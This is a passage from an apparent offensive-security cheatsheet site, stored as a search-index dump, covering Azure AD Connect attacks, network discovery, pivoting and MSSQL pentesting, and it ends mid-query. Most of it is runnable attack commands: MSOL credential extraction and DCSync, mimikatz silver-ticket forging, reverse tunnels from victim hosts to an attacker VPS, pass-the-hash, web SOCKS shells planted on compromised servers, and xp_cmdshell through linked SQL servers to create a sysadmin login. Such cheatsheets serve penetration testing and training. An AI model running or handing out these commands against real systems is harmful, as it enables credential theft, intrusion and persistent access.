Get-AADIntPTASpyLog -DecodePasswords Azure AD Connect - Password extraction # Credentials in AD Sync : C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf\nTool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes git clone https://github.com/fox-it/adconnectdump # DCSync with AD Sync account Azure AD Connect - MSOL Account\u0026rsquo;s password and DCSync # You can perform DCSync attack using the MSOL account.\nRequirements:\nCompromise a server with Azure AD Connect service Access to ADSyncAdmins or local Administrators groups Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account:\nazuread_decrypt_msol.ps1: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 azuread_decrypt_msol_v2.ps1: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.\nAzure AD Connect - Seamless Single Sign On Silver Ticket # Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)\nSeamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD.\n:warning: The password of the AZUREADSSOACC account never changes.\nUsing https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 \u0026amp; Azure\nNTLM password hash of the AZUREADSSOACC account, e.g. f9969e088b2c13d93833d0ce436c76dd. mimikatz.exe \u0026#34;lsadump::dcsync /user:AZUREADSSOACC$\u0026#34; exit AAD logon name of the user we want to impersonate, e.g. elrond@contoso.com. This is typically either his userPrincipalName or mail attribute from the on-prem AD. SID of the user we want to impersonate, e.g. S-1-5-21-2121516926-2695913149-3163778339-1234. Create the Silver Ticket and inject it into Kerberos cache: mimikatz.exe \u0026#34;kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\u0026#34; exit Launch Mozilla Firefox Go to about:config and set the network.negotiate-auth.trusted-uris preference to value https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty. References # Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !! Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9 Azure AD Pass The Certificate - Mor - Aug 19, 2020 Get Access Tokens for Managed Service Identity on Azure App Service Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen An introduction to penetration testing Azure - Akimbocore Running Powershell scripts on Azure VM - Netspi Attacking Azure Cloud shell - Netspi Maintaining Azure Persistence via automation accounts - Netspi Detecting an attacks on active directory with Azure - Smartspate Azure AD Overview Windows Azure Active Directory in plain English Building Free Active Directory Lab in Azure - @kamran.bilgrami Attacking Azure/Azure AD and introducing Powerzure - SpecterOps Azure AD connect for RedTeam - @xpnsec Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020 Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020 Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020 AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20 Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter The Art of the Device Code Phish - Bobby Cooke AZURE AD cheatsheet - BlackWasp "},{"id":25,"href":"/docs/network_discovery/","title":"Network Discovery","section":"Docs","content":" Network Discovery # Nmap # Ping sweep (No port scan, No DNS resolution) nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v \u0026#34;host down\u0026#34; -sn : Disable port scanning. Host discovery only. -n : Never do DNS resolution Basic NMAP sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4 sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv • the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports • the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000) • 192.168.0.1 is the IP address to scan • -oA OUTPUTFILE tells Nmap to output the findings in its three major formats at once using the filename \u0026#34;OUTPUTFILE\u0026#34; • -iL INPUTFILE tells Nmap to use the provided file as inputs CTF NMAP This configuration is enough to do a basic check for a CTF VM\nnmap -sV -sC -oA ~/nmap-initial 192.168.1.1 -sV : Probe open ports to determine service/version info -sC : to enable the script -oA : to save the results After this quick command you can add \u0026#34;-p-\u0026#34; to run a full scan while you work with the previous result Aggressive NMAP nmap -A -T4 scanme.nmap.org • -A: Enable OS detection, version detection, script scanning, and traceroute • -T4: Defines the timing for the task (options are 0-5 and higher is faster) Using searchsploit to detect vulnerable services nmap -p- -sV -oX a.xml IP_ADDRESS; searchsploit --nmap a.xml Generating nice scan report nmap -sV IP_ADDRESS -oX scan.xml \u0026amp;\u0026amp; xsltproc scan.xml -o \u0026#34;`date +%m%d%y`_report.html\u0026#34; NMAP Scripts nmap -sC : equivalent to --script=default nmap --script \u0026#39;http-enum\u0026#39; -v web.xxxx.com -p80 -oN http-enum.nmap PORT STATE SERVICE 80/tcp open http | http-enum: | /phpmyadmin/: phpMyAdmin | /.git/HEAD: Git folder | /css/: Potentially interesting directory w/ listing on \u0026#39;apache/2.4.10 (debian)\u0026#39; |_ /image/: Potentially interesting directory w/ listing on \u0026#39;apache/2.4.10 (debian)\u0026#39; nmap --script smb-enum-users.nse -p 445 [target host] Host script results: | smb-enum-users: | METASPLOITABLE\\backup (RID: 1068) | Full name: backup | Flags: Account disabled, Normal user account | METASPLOITABLE\\bin (RID: 1004) | Full name: bin | Flags: Account disabled, Normal user account | METASPLOITABLE\\msfadmin (RID: 3000) | Full name: msfadmin,,, | Flags: Normal user account List Nmap scripts : ls /usr/share/nmap/scripts/ Spyse # Spyse API - for detailed info is better to check Spyse\nSpyse Wrapper\nSearching for subdomains # spyse -target xbox.com --subdomains Reverse IP Lookup # spyse -target 52.14.144.171 --domains-on-ip Searching for SSL certificates # spyse -target hotmail.com --ssl-certificates spyse -target \u0026#34;org: Microsoft\u0026#34; --ssl-certificates Getting all DNS records # spyse -target xbox.com --dns-all Masscan # masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000 # find machines on the network sudo masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp cat masscan_machines.tmp | grep open | cut -d \u0026#34; \u0026#34; -f4 | sort -u \u0026gt; masscan_machines.lst # find open ports for one machine sudo masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst # TCP grab banners and services information TCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d \u0026#34; \u0026#34; -f3 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | head -c -1) [ \u0026#34;$TCP_PORTS\u0026#34; ] \u0026amp;\u0026amp; sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP # UDP grab banners and services information UDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d \u0026#34; \u0026#34; -f3 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | head -c -1) [ \u0026#34;$UDP_PORTS\u0026#34; ] \u0026amp;\u0026amp; sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP Reconnoitre # Dependencies:\nnbtscan nmap python2.7 ./reconnoitre.py -t 192.168.1.2-252 -o ./results/ --pingsweep --hostnames --services --quick If you have a segfault with nbtscan, read the following quote.\nPermission is denied on the broadcast address (.0) and it segfaults on the gateway (.1) - all other addresses seem fine here.So to mitigate the problem: nbtscan 192.168.0.2-255\nNetdiscover # netdiscover -i eth0 -r 192.168.1.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 20 Captured ARP Req/Rep packets, from 4 hosts. Total size: 876 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++-- 192.168.1.AA 68:AA:AA:AA:AA:AA 15 630 Sagemcom 192.168.1.XX 52:XX:XX:XX:XX:XX 1 60 Unknown vendor 192.168.1.YY 24:YY:YY:YY:YY:YY 1 60 QNAP Systems, Inc. 192.168.1.ZZ b8:ZZ:ZZ:ZZ:ZZ:ZZ 3 126 HUAWEI TECHNOLOGIES CO.,LTD Responder # responder -I eth0 -A # see NBT-NS, BROWSER, LLMNR requests without responding. responder.py -I eth0 -wrf Alternatively you can use the Windows version\nBettercap # bettercap -X --proxy --proxy-https -T \u0026lt;target IP\u0026gt; # better cap in spoofing, discovery, sniffer # intercepting http and https requests, # targetting specific IP only References # TODO "},{"id":26,"href":"/docs/network_pivoting_techniques/","title":"Network Pivoting Cheatsheet","section":"Docs","content":" Network Pivoting Techniques # Windows netsh Port Forwarding # netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110 # Forward the port 4545 for the reverse shell, and the 80 for the http server for example netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545 netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80 # Correctly open the port on the machine netsh advfirewall firewall add rule name=\u0026#34;PortForwarding 80\u0026#34; dir=in action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=\u0026#34;PortForwarding 80\u0026#34; dir=out action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=\u0026#34;PortForwarding 4545\u0026#34; dir=in action=allow protocol=TCP localport=4545 netsh advfirewall firewall add rule name=\u0026#34;PortForwarding 4545\u0026#34; dir=out action=allow protocol=TCP localport=4545 listenaddress – is a local IP address waiting for a connection. listenport – local listening TCP port (the connection is waited on it). connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected. connectport – is a TCP port to which the connection from listenport is forwarded to. SSH # SOCKS Proxy # ssh -D8080 [user]@[host] ssh -N -f -D 9000 [user]@[host] -f : ssh in background -N : do not execute a remote command Cool Tip : Konami SSH Port forwarding\n[ENTER] + [~C] -D 1090 Local Port Forwarding # ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host] Remote Port Forwarding # ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host] ssh -R 3389:10.1.1.224:3389 root@10.11.0.32 Proxychains # Config file: /etc/proxychains.conf\n[ProxyList] socks4 localhost 8080 Set the SOCKS4 proxy then proxychains nmap -sT 192.168.5.6\nGraftcp # A flexible tool for redirecting a given program\u0026rsquo;s TCP traffic to SOCKS5 or HTTP proxy.\n:warning: Same as proxychains, with another mechanism to \u0026ldquo;proxify\u0026rdquo; which allow Go applications.\n# https://github.com/hmgle/graftcp # Create a SOCKS5, using Chisel or another tool and forward it through SSH (attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS (vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse (victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks # Run graftcp and specify the SOCKS5 (attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080 (attacker) $ graftcp ./nuclei -u http://172.16.1.24 Simple configuration file for graftcp\n# https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf ## Listen address (default \u0026#34;:2233\u0026#34;) listen = :2233 loglevel = 1 ## SOCKS5 address (default \u0026#34;127.0.0.1:1080\u0026#34;) socks5 = 127.0.0.1:1080 # socks5_username = SOCKS5USERNAME # socks5_password = SOCKS5PASSWORD ## Set the mode for select a proxy (default \u0026#34;auto\u0026#34;) select_proxy_mode = auto Web SOCKS - reGeorg # reGeorg, the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.\nDrop one of the following files on the server:\ntunnel.ashx tunnel.aspx tunnel.js tunnel.jsp tunnel.nosocket.php tunnel.php tunnel.tomcat.5.jsp python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080 optional arguments: -h, --help show this help message and exit -l , --listen-on The default listening address -p , --listen-port The default listening port -r , --read-buff Local read buffer, max data to be sent per POST -u , --url The url containing the tunnel script -v , --verbose Verbose output[INFO|DEBUG] Web SOCKS - pivotnacci # pivotnacci, a tool to make socks connections through HTTP agents.\npip3 install pivotnacci pivotnacci https://domain.com/agent.php --password \u0026#34;s3cr3t\u0026#34; pivotnacci https://domain.com/agent.php --polling-interval 2000 Metasploit # # Meterpreter list active port forwards portfwd list # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell portfwd add –l 3389 –p 3389 –r target-host portfwd add -l 88 -p 88 -r 127.0.0.1 portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445 # Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell portfwd delete –l 3389 –p 3389 –r target-host # Meterpreter delete all port forwards portfwd flush or # Use Meterpreters autoroute script to add the route for specified subnet 192.168.15.0 run autoroute -s 192.168.15.0/24 use auxiliary/server/socks_proxy set SRVPORT 9090 set VERSION 4a # or use auxiliary/server/socks4a # (deprecated) # Meterpreter list all active routes run autoroute -p route #Meterpreter view available networks the compromised host can access # Meterpreter add route for 192.168.14.0/24 via Session number. route add 192.168.14.0 255.255.255.0 3 # Meterpreter delete route for 192.168.14.0/24 via Session number. route delete 192.168.14.0 255.255.255.0 3 # Meterpreter delete all routes route flush Empire # (Empire) \u0026gt; socksproxyserver (Empire) \u0026gt; use module management/invoke_socksproxy (Empire) \u0026gt; set remoteHost 10.10.10.10 (Empire) \u0026gt; run sshuttle # Transparent proxy server that works as a poor man\u0026rsquo;s VPN. Forwards over ssh.\nDoesn\u0026rsquo;t require admin. Works with Linux and MacOS. Supports DNS tunneling. pacman -Sy sshuttle apt-get install sshuttle sshuttle -vvr user@10.10.10.10 10.1.1.0/24 sshuttle -vvr username@pivot_host 10.2.2.0/24 # using a private key $ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e \u0026#34;ssh -i ~/.ssh/id_rsa\u0026#34; # -x == exclude some network to not transmit over the tunnel # -x x.x.x.x.x/24 chisel # go get -v github.com/jpillora/chisel # forward port 389 and 88 to hacker computer user@hacker$ /opt/chisel/chisel server -p 8008 --reverse user@victim$ .\\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 # SOCKS user@victim$ .\\chisel.exe client YOUR_IP:8008 R:socks SharpChisel # A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel\nuser@hacker$ ./chisel server -p 8080 --key \u0026#34;private\u0026#34; --auth \u0026#34;user:pass\u0026#34; --reverse --proxy \u0026#34;https://www.google.com\u0026#34; ================================================================ server : run the Server Component of chisel -p 8080 : run server on port 8080 --key \u0026#34;private\u0026#34;: use \u0026#34;private\u0026#34; string to seed the generation of a ECDSA public and private key pair --auth \u0026#34;user:pass\u0026#34; : Creds required to connect to the server --reverse: Allow clients to specify reverse port forwarding remotes in addition to normal remotes. --proxy https://www.google.com : Specifies another HTTP server to proxy requests to when chisel receives a normal HTTP request. Useful for hiding chisel in plain sight. user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks Ligolo # Ligolo : Reverse Tunneling made easy for pentesters, by pentesters\nBuild Ligolo # Get Ligolo and dependencies cd `go env GOPATH`/src git clone https://github.com/sysdream/ligolo cd ligolo make dep # Generate self-signed TLS certificates (will be placed in the certs folder) make certs TLS_HOST=example.com make build-all Use Ligolo # On your attack server. ./bin/localrelay_linux_amd64 # On the compromise host. ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555 Gost # Wiki English : https://docs.ginuerzh.xyz/gost/en/\ngit clone https://github.com/ginuerzh/gost cd gost/cmd/gost go build # Socks5 Proxy Server side: gost -L=socks5://:1080 Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true # Local Port Forward gost -L=tcp://:2222/192.168.1.1:22 [-F=..] Rpivot # Server (Attacker box)\npython server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0 Client (Compromised box)\npython client.py --server-ip \u0026lt;ip\u0026gt; --server-port 9443 Through corporate proxy\npython client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\ --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e Passing the hash\npython client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \\ --ntlm-proxy-port 8080 --domain CORP --username jdoe \\ --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE revsocks # # Listen on the server and create a SOCKS 5 proxy on port 1080 user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234 # Connect client to the server user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent \u0026#34;Mozilla 5.0/IE Windows 10\u0026#34; # Build for Linux git clone https://github.com/kost/revsocks export GOPATH=~/go go get github.com/hashicorp/yamux go get github.com/armon/go-socks5 go get github.com/kost/go-ntlmssp go build go build -ldflags=\u0026#34;-s -w\u0026#34; \u0026amp;\u0026amp; upx --brute revsocks # Build for Windows go get github.com/hashicorp/yamux go get github.com/armon/go-socks5 go get github.com/kost/go-ntlmssp GOOS=windows GOARCH=amd64 go build -ldflags=\u0026#34;-s -w\u0026#34; go build -ldflags -H=windowsgui upx revsocks plink # # exposes the SMB port of the machine in the port 445 of the SSH Server plink -l root -pw toor -R 445:127.0.0.1:445 # exposes the RDP port of the machine in the port 3390 of the SSH Server plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389 plink -l root -pw mypassword 192.168.18.84 -R plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445 plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP] # redirects the Windows port 445 to Kali on port 22 plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185 ngrok # # get the binary wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip unzip ngrok-stable-linux-amd64.zip # log into the service ./ngrok authtoken 3U[REDACTED_TOKEN]Hm # deploy a port forwarding for 4433 ./ngrok http 4433 ./ngrok tcp 4433 cloudflared # # Get the binary wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz tar xvzf cloudflared-stable-linux-amd64.tgz # Expose accessible internal service to the internet ./cloudflared tunnel --url \u0026lt;protocol\u0026gt;://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt; Capture a network trace with builtin tools # Windows (netsh) # start a capture use the netsh command. netsh trace start capture=yes report=disabled tracefile=c:\\trace.etl maxsize=16384 # stop the trace netsh trace stop # Event tracing can be also used across a reboots netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\\trace.etl maxsize=16384 # To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version. etl2pcapng.exe c:\\trace.etl c:\\trace.pcapng # Use filters netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\\trace.etl maxsize=16384 Linux (tcpdump) sudo apt-get install tcpdump tcpdump -w 0001.pcap -i eth0 tcpdump -A -i eth0 # capture every TCP packet tcpdump -i eth0 tcp # capture everything on port 22 tcpdump -i eth0 port 22 Basic Pivoting Types # | Type | Use Case | | :++++++++++++- | :++++++++++++++++++++++++++++++++++++++++++ | | Listen - Listen | Exposed asset, may not want to connect out. | | Listen - Connect | Normal redirect. | | Connect - Connect | Can’t bind, so connect to bridge two hosts |\nListen - Listen # | Type | Use Case | | :++++++++++++- | :++++++++++++++++++++++++++++++++++++++++++ | | ncat | ncat -v -l -p 8080 -c \u0026quot;ncat -v -l -p 9090\u0026quot;| | socat | socat -v tcp-listen:8080 tcp-listen:9090 | | remote host 1 | ncat localhost 8080 \u0026lt; file | | remote host 2 | ncat localhost 9090 \u0026gt; newfile |\nListen - Connect # | Type | Use Case | | :++++++++++++- | :++++++++++++++++++++++++++++++++++++++++++ | | ncat | ncat -l -v -p 8080 -c \u0026quot;ncat localhost 9090\u0026quot; | | socat | socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090 | | remote host 1 | ncat localhost -p 8080 \u0026lt; file | | remote host 2 | ncat -l -p 9090 \u0026gt; newfile |\nConnect - Connect # | Type | Use Case | | :++++++++++++- | :++++++++++++++++++++++++++++++++++++++++++ | | ncat | ncat localhost 8080 -c \u0026quot;ncat localhost 9090\u0026quot; | | socat | socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090 | | remote host 1 | ncat -l -p 8080 \u0026lt; file | | remote host 2 | ncat -l -p 9090 \u0026gt; newfile |\nReferences # Port Forwarding in Windows - Windows OS Hub Using the SSH \u0026ldquo;Konami Code\u0026rdquo; (SSH Control Sequences) - Jeff McJunkin A Red Teamer\u0026rsquo;s guide to pivoting- Mar 23, 2017 - Artem Kondratenko Pivoting Meterpreter 🇫🇷 Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI - 🇺🇸 Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8 Active Directory - hideandsec Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert "},{"id":27,"href":"/docs/mssql_server_cheatsheet/","title":"Pentesting MSSQL Server Cheatsheet","section":"Docs","content":" MSSQL Server # Identify Instances and Databases # Discover Local SQL Server Instances # Get-SQLInstanceLocal Discover Domain SQL Server Instances # Get-SQLInstanceDomain -Verbose # Get Server Info for Found Instances Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Get Database Names Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults Discover Remote SQL Server Instances # Get-SQLInstanceBroadcast -Verbose Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 Identify Encrypted databases # Note: These are automatically decrypted for admins\nGet-SQLDatabase -Username sa -Password Password1234 -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Verbose | Where-Object {$_.is_encrypted -eq \u0026#34;True\u0026#34;} Version Query # Get-SQLInstanceDomain | Get-Query \u0026#34;select @@version\u0026#34; Identify Sensitive Information # Get Tables from a Specific Database # Get-SQLInstanceDomain | Get-SQLTable -DatabaseName \u0026lt;DBNameFromGet-SQLDatabaseCommand\u0026gt; -NoDefaults Get Column Details from a Table Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName \u0026lt;DBName\u0026gt; -TableName \u0026lt;TableName\u0026gt; Gather 5 Entries from Each Column # Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords \u0026#34;\u0026lt;columnname1,columnname2,columnname3,columnname4,columnname5\u0026gt;\u0026#34; -Verbose -SampleSize 5 Gather 5 Entries from a Specific Table # Get-SQLQuery -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#39;select TOP 5 * from \u0026lt;DatabaseName\u0026gt;.dbo.\u0026lt;TableName\u0026gt;\u0026#39; Dump common information from server to files # Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\\Instance1 -csv Linked Database # Find Trusted Link # select * from master..sysservers Execute Query Through The Link # -- execute query through the link select * from openquery(\u0026#34;dcorp-sql1\u0026#34;, \u0026#39;select * from master..sysservers\u0026#39;) select version from openquery(\u0026#34;linkedserver\u0026#34;, \u0026#39;select @@version as version\u0026#39;); -- chain multiple openquery select version from openquery(\u0026#34;link1\u0026#34;,\u0026#39;select version from openquery(\u0026#34;link2\u0026#34;,\u0026#34;select @@version as version\u0026#34;)\u0026#39;) -- execute shell commands EXECUTE(\u0026#39;sp_configure \u0026#39;\u0026#39;xp_cmdshell\u0026#39;\u0026#39;,1;reconfigure;\u0026#39;) AT LinkedServer select 1 from openquery(\u0026#34;linkedserver\u0026#34;,\u0026#39;select 1;exec master..xp_cmdshell \u0026#34;dir c:\u0026#34;\u0026#39;) -- create user and give admin privileges EXECUTE(\u0026#39;EXECUTE(\u0026#39;\u0026#39;CREATE LOGIN hacker WITH PASSWORD = \u0026#39;\u0026#39;\u0026#39;\u0026#39;P@ssword123.\u0026#39;\u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;) AT \u0026#34;DOMINIO\\SERVER1\u0026#34;\u0026#39;) AT \u0026#34;DOMINIO\\SERVER2\u0026#34; EXECUTE(\u0026#39;EXECUTE(\u0026#39;\u0026#39;sp_addsrvrolemember \u0026#39;\u0026#39;\u0026#39;\u0026#39;hacker\u0026#39;\u0026#39;\u0026#39;\u0026#39; , \u0026#39;\u0026#39;\u0026#39;\u0026#39;sysadmin\u0026#39;\u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;) AT \u0026#34;DOMINIO\\SERVER1\u0026#34;\u0026#39;) AT \u0026#34;DOMINIO\\SERVER2\u0026#34; Crawl Links for Instances in the Domain # A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results\nGet-SQLInstanceDomain | Get-SQLServerLink -Verbose select * from master..sysservers Crawl Links for a Specific Instance # Get-SQLServerLinkCrawl -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Verbose select * from openquery(\u0026#34;\u0026lt;instance\u0026gt;\u0026#34;,\u0026#39;select * from openquery(\u0026#34;\u0026lt;instance2\u0026gt;\u0026#34;,\u0026#39;\u0026#39;select * from master..sysservers\u0026#39;\u0026#39;)\u0026#39;) Query Version of Linked Database # Get-SQLQuery -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#34;select * from openquery(`\u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;`\u0026#34;,\u0026#39;select @@version\u0026#39;)\u0026#34; -Verbose Execute Procedure on Linked Database # SQL\u0026gt; EXECUTE(\u0026#39;EXEC sp_configure \u0026#39;\u0026#39;show advanced options\u0026#39;\u0026#39;,1\u0026#39;) at \u0026#34;linked.database.local\u0026#34;; SQL\u0026gt; EXECUTE(\u0026#39;RECONFIGURE\u0026#39;) at \u0026#34;linked.database.local\u0026#34;; SQL\u0026gt; EXECUTE(\u0026#39;EXEC sp_configure \u0026#39;\u0026#39;xp_cmdshell\u0026#39;\u0026#39;,1;\u0026#39;) at \u0026#34;linked.database.local\u0026#34;; SQL\u0026gt; EXECUTE(\u0026#39;RECONFIGURE\u0026#39;) at \u0026#34;linked.database.local\u0026#34;; SQL\u0026gt; EXECUTE(\u0026#39;exec xp_cmdshell whoami\u0026#39;) at \u0026#34;linked.database.local\u0026#34;; Determine Names of Linked Databases # tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.\nGet-SQLQuery -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#34;select * from openquery(`\u0026#34;\u0026lt;DatabaseLinkName\u0026gt;`\u0026#34;,\u0026#39;select name from sys.databases\u0026#39;)\u0026#34; -Verbose Determine All the Tables Names from a Selected Linked Database # The result is TableName which feeds into following query\nGet-SQLQuery -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#34;select * from openquery(`\u0026#34;\u0026lt;DatabaseLinkName\u0026gt;`\u0026#34;,\u0026#39;select name from \u0026lt;DatabaseNameFromPreviousCommand\u0026gt;.sys.tables\u0026#39;)\u0026#34; -Verbose Gather the Top 5 Columns from a Selected Linked Table # The results are ColumnName and ColumnValue which feed into following query\nGet-SQLQuery -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#34;select * from openquery(`\u0026#34;\u0026lt;DatabaseLinkName\u0026gt;`\u0026#34;,\u0026#39;select TOP 5 * from \u0026lt;DatabaseNameFromPreviousCommand\u0026gt;.dbo.\u0026lt;TableNameFromPreviousCommand\u0026gt;\u0026#39;)\u0026#34; -Verbose Gather Entries from a Selected Linked Column # Get-SQLQuery -Instance \u0026#34;\u0026lt;DBSERVERNAME\\DBInstance\u0026gt;\u0026#34; -Query \u0026#34;select * from openquery(`\u0026#34;\u0026lt;DatabaseLinkName\u0026gt;`\u0026#34;\u0026#39;select * from \u0026lt;DatabaseNameFromPreviousCommand\u0026gt;.dbo.\u0026lt;TableNameFromPreviousCommand\u0026gt; where 